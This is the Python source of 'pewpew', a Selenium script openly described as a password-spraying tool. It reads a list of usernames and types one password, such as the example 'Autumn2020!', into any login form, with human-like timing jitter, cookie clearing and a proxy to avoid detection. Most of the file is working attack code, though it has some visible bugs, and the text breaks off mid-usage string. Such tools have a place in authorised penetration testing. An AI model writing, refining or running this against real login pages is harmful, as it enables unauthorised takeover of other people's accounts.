"""
pewpew: selenium spraying script for all them crazy m0nkeys
"""
import argparse,os,sys,random,time
from argparse import RawTextHelpFormatter
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException


def create_driver(proxyaddr, user, password, resolution):
        
    capability = webdriver.DesiredCapabilities.CHROME
    capability['proxy'] = {
        "httpProxy": proxyaddr,
        "ftpProxy": proxyaddr,
        "sslProxy": proxyaddr,
        "proxyType": "manual"
    }

    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--incognito")
    chrome_options.add_argument('ignore-certificate-errors')
    chrome_options.add_argument("--window-size="+resolution)
    PATH = "C:\Users\bubbles\pathto\chromedriver.exe"
    chrome_driver = webdriver.Chrome(executable_path=PATH,options=chrome_options,desired_capabilities=capability)
    return chrome_driver


def waitforit(scale=1):
    sleepnumoffset = random.random()
    offset = sleepnumoffset + scale
    time.sleep(offset)


def use_keys(element,sometext):
    for key in sometext:
        jitter = round(random.uniform(0.025, 0.1), 10)
        time.sleep(jitter)
        element.send_keys(key)
  

def grab_xpath():
    uname_xpath = input("Enter USERNAME field xpath:")
    pwd_xpath = input("Enter PASSWORD field xpath:")
    submit_xpath = input("Enter SUBMIT button xpath:")
    return uname_xpath,pwd_xpath,submit_xpath

def load_xpaths(xpath_file):
    f = open( xpath_file, "r" )
    xpaths = []
    for line in f:
        xpaths.append(line)
    f.close() 
    return xpaths[0],xpaths[1],xpaths[2]

def automate_keyboard(url,proxy,usersfile,password,delay,pause,resolution,xpath_file):
    
    if xpath_file:
        uname_xpath,pwd_xpath,submit_xpath = load_xpaths(xpath_file)
    else:
        uname_xpath,pwd_xpath,submit_xpath = grab_xpath()
        
    driver = create_driver(proxy,resolution)

    with open(usersfile, 'r') as f:
        users = [line.rstrip() for line in f]
        for user in users:
            driver.get(url)
            waitforit(delay)
                        
            uname = driver.find_element_by_xpath(uname_xpath)
            pwd = driver.find_element_by_xpath(pwd_xpath)
            submit = driver.find_element_by_xpath(submit_xpath)
            
            use_keys(uname,user)
            waitforit(pause)
            use_keys(pwd,password)

            click_jitter = round(random.uniform(0.15, 0.35), 10)
            time.sleep(click_jitter)
            submit.click()

            proceed_jitter = round(random.uniform(1, 1.5), 10)
            time.sleep(proceed_jitter)
            waitforit(delay)
            driver.delete_all_cookies()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="""
            
            A Selenium password spraying script that accepts XPATHs as input on launch.

            Example usage:  .pewpew.py -t "https://www.example.com/login" -p "127.0.0.1:8080" -u users.txt --password Autumn2020!
                            .pewpew.py -t "https://www.example.com/login" -p "127.0.0.1:8080" -u users.txt --password Autumn2020! -f xpathfile.txt


































